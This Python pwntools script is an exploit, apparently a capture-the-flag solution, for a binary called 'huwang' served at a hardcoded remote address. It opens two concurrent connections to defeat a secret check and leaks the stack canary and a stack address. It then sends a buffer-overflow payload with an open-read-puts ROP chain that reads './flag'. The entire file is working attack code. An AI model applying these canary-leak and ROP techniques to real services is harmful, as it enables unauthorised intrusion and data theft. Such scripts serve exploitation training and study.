#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys

context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.binary = "./huwang"
elf = context.binary
elfPath = "./huwang"
libcPath = "./libc.so.6"
remoteAddr = "49.4.78.80"
remotePort = 31445

if sys.argv[1] == "l":
    p1 = process(elfPath)
    p2 = process(elfPath)
else:
    p1 = remote(remoteAddr, remotePort)
    p2 = remote(remoteAddr, remotePort)

def secret_p1(name, cnt):
    p1.sendlineafter("command>> \n", "666")
    sleep(0.01)
    p1.sendafter("name\n", name)
    sleep(0.01)
    p1.sendlineafter("secret?\n", "y")
    sleep(0.01)
    p1.sendlineafter("secret:\n", str(cnt))
    sleep(0.01)

def secret_p2(name, cnt, secret):
    p2.sendlineafter("command>> \n", "666")
    sleep(0.01)
    p2.sendafter("name\n", name)
    sleep(0.01)
    p2.sendlineafter("secret?\n", "y")
    sleep(0.01)
    p2.sendlineafter("secret:\n", str(cnt))
    sleep(0.01)
    p2.sendafter("secret\n", secret)
    sleep(0.01)

if __name__== "__main__":
    secret_p1("name", -1)
    '''
    >>> from hashlib import md5
    >>> s = '\0' * 16
    >>> md5(s).hexdigest()
    '4ae71336e44bf9bf79d2752e234818a5'
    '''
    #  info("pid -> {}".format(p2.pid))
    #  raw_input("DEBUG: ")
    #  context.log_level = "debug"

    #  gdb.attach(p2, "b *0x40110D\nb*0x401051\nc")
    secret_p2('x' * (24 + 1), 1, flat(0xbff94be43613e74a, 0xa51848232e75d279))
    sleep(0.01)
    p2.recvuntil('x' * (24 + 1))
    canary = '\x00' + p2.recvn(7)
    success("canary : " + canary.encode('hex'))
    stack = u64(p2.recvn(6) + '\0\0') - 0x2d0
    success("stack -> {:#x}".format(stack))

    p2.sendafter("occupation?\n", cyclic(length = 255, n = 8))
    sleep(0.01)
    p2.sendlineafter("yourself[Y/N]\n", "Y")
    sleep(0.01)

    '''
    0x0000000000401573: pop rdi; ret;
    0x0000000000401571: pop rsi; pop r15; ret;
    .text:000000000040113F                 leave
    .text:0000000000401140                 retn
    '''
    base = elf.bss() + 0x300
    prdi = 0x0000000000401573
    prsip = 0x0000000000401571
    flag_addr = stack + 0x120
    leaveret = 0x40113F

    orw = flat(prdi, flag_addr, prsip, 0, 0, elf.plt['open'])
    orw += flat(prdi, 3, prsip, base, 0, elf.plt['read'])
    orw += flat(prdi, base, elf.plt['puts'])
    payload = "./flag\0\0" + orw
    payload = payload.ljust(0x108, '\0') + canary
    payload += flat(flag_addr, leaveret)

    #  gdb.attach(p2, "b *0x401140\nc")
    p2.send(payload)

    #  p2.interactive()
    print p2.recvall()
    p1.close()
    p2.close()
